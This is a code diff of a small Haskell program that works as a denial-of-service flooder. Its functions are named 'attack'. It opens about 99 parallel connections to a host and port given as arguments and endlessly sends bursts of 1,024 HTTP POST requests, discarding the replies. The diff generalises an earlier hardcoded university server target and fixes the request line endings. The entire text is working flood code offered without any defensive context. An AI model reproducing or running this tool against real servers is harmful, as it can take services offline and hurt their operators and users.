@@ -10,18 +10,21 @@ import System.Environment
 main = do
   [host, port] <- getArgs
   sh <- connectTo host $ PortNumber $ fromIntegral $ read port
-  B.hPutStr sh "POST /register/robgssp HTTP/1.1\n\n"
-  forM_ ([0..98]::[Int]) $ \_ -> forkIO attack
+  B.hPutStr sh "POST /register/robgssp HTTP/1.1\r\n\r\n"
+  forM_ ([0..98]::[Int]) $ \_ -> forkIO (attack host (fromIntegral (read port)))
   attack1 sh
 
-attack = (connectTo "jake.csh.rit.edu" $ PortNumber 8080) >>= attack1
+attack host port = (connectTo host $ PortNumber port) >>= attack1
 
 attack1 sh = do
   forkIO $ do
-    let sz = 1024*1024
-    buf <- mallocBytes sz
-    forever $ hGetBuf sh buf sz >> return () 
-  forever $ B.hPutStr sh prepmsg
+    -- let sz = 1024*1024
+    -- buf <- mallocBytes sz
+    -- forever $ hGetBuf sh buf sz >> return ()
+    forever $ B.hGet sh (1024*1024)
+  forever $ do
+    B.hPutStr sh prepmsg
+    putStrLn "hit"
 
 prepmsg :: B.ByteString
-prepmsg = B.concat $ take 1024 $ repeat "POST /robgssp HTTP/1.1\n\n"
+prepmsg = B.concat $ take 1024 $ repeat "POST /robgssp HTTP/1.1\r\n\r\n"
